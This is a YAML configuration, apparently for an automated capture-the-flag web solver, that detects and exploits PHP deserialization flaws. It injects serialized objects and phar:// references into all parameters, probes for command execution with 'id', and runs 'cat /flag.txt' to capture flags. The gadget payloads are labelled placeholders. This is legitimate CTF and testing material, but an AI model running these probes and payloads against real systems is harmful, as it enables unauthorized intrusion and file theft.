id: web_php_deserialization
name: PHP Deserialization
category: web
version: "1.0"
author: system
description: >
  Detects PHP deserialization vulnerabilities, allowing attackers to manipulate objects
  or achieve Remote Code Execution (RCE) by exploiting "magic methods" with crafted
  serialized data or PHAR archives.

applies_when:
  - "context.challenge.type == 'web'"

min_confidence: 0.10
stop_on_flag: true

confidence_seeds:
  - if: "'php' in context.tech_stack"
    boost: 0.20
    label: "PHP detected in tech stack"
  - if: "any(p in context.params for p in ['data', 'object', 'serialized', 'payload', 'cookie', 'state'])"
    boost: 0.15
    label: "Deserialization-suggesting parameter found"
  - if: "any('O:' in r for r in context.responses) or any('C:' in r for r in context.responses)"
    boost: 0.10
    label: "Serialized PHP object signature detected in response"

detection_paths:
  - id: basic_serialized_object_probe
    name: Basic Serialized Object Probe
    description: >
      Injects a simple serialized PHP object (e.g., `O:8:"stdClass":0:{}`) and checks for application errors
      or unexpected behavior, indicating deserialization.
    min_confidence: 0.10
    steps:
      - id: inject_stdclass_payload
        action: http_probe
        params:
          inject_into: all_params
          payloads:
            - 'O:8:"stdClass":0:{}' # Basic serialized object
            - 'O:8:"stdClass":1:{s:3:"foo";s:3:"bar";}' # Object with a property
        signals:
          - match: '(?i)unserialize\(\) expects parameter|failed to unserialize|__wakeup|__destruct' # Error messages
            on_match:
              confidence_boost: 0.35
              emit: php_deserialization_error
          - match: '500 Internal Server Error' # Generic server error
            on_match:
              confidence_boost: 0.25
              emit: php_deserialization_potential

  - id: phpggc_exec_gadget_probe
    name: PHPggc Generic RCE Gadget Probe
    description: >
      Injects a generic PHPggc payload (e.g., targeting `system('id')`) and looks for OS command execution output.
      This requires a vulnerable library to be present and a suitable gadget chain.
    min_confidence: 0.25
    steps:
      - id: inject_phpggc_id_payload
        action: http_probe
        params:
          inject_into: all_params
          # Example phpggc payload (simplified for demonstration, typically much longer)
          # This represents a serialized object that, when deserialized, executes system('id')
          # It would be generated by phpggc like: phpggc --fast-destruct -o raw system id
          payloads:
            - 'O:4:"RCE":1:{s:4:"cmd";s:2:"id";}' # Placeholder for actual phpggc payload
        signals:
          - match: 'uid=|gid=' # Output of 'id' command
            on_match:
              confidence_boost: 0.50
              emit: php_deserialization_rce_detected

  - id: phar_deserialization_probe
    name: PHAR Deserialization Probe
    description: >
      Attempts to trigger PHAR deserialization by injecting a crafted PHAR archive reference
      into file operation functions (e.g., `file_exists()`, `file_get_contents()`).
    min_confidence: 0.20
    steps:
      - id: inject_phar_payload
        action: http_probe
        params:
          inject_into: all_params
          # Example phar:// payload (requires a pre-crafted malicious PHAR file)
          # The PHAR file itself contains serialized metadata that triggers RCE on deserialization
          payloads:
            - 'phar:///path/to/evil.phar/file.txt' # Placeholder for PHAR file path
        signals:
          - match: 'uid=|gid=' # Output of a command executed by the PHAR
            on_match:
              confidence_boost: 0.45
              emit: phar_deserialization_rce_detected
          - match: '(?i)failed to open stream: phar error' # PHAR processing error, still indicates attempt
            on_match:
              confidence_boost: 0.20
              emit: phar_deserialization_attempt

exploitation_paths:
  - id: rce_via_php_deserialization
    name: RCE via PHP Deserialization
    requires_signal: php_deserialization_rce_detected
    technique: php_deserialization_rce
    description: >
      Confirmed Remote Code Execution via PHP object deserialization. Attempting to retrieve flag.
    steps:
      - id: get_flag_php_rce
        action: http_probe
        params:
          inject_into: vulnerable_param
          # Payload to read /flag.txt
          payloads:
            - 'O:4:"RCE":1:{s:4:"cmd";s:12:"cat /flag.txt";}' # Placeholder for actual phpggc payload
        capture:
          - pattern: 'flag\{[^}]+\}'
            as: flag_value
          - pattern: 'CTF\{[^}]+\}'
            as: flag_value

  - id: rce_via_phar_deserialization
    name: RCE via PHAR Deserialization
    requires_signal: phar_deserialization_rce_detected
    technique: phar_deserialization_rce
    description: >
      Confirmed Remote Code Execution via PHAR deserialization. Attempting to retrieve flag.
    steps:
      - id: get_flag_phar_rce
        action: http_probe
        params:
          inject_into: vulnerable_param
          # Payload referencing a PHAR file that executes `cat /flag.txt`
          payloads:
            - 'phar:///path/to/evil_flag.phar/file.txt' # Placeholder for PHAR file path
        capture:
          - pattern: 'flag\{[^}]+\}'
            as: flag_value
          - pattern: 'CTF\{[^}]+\}'
            as: flag_value
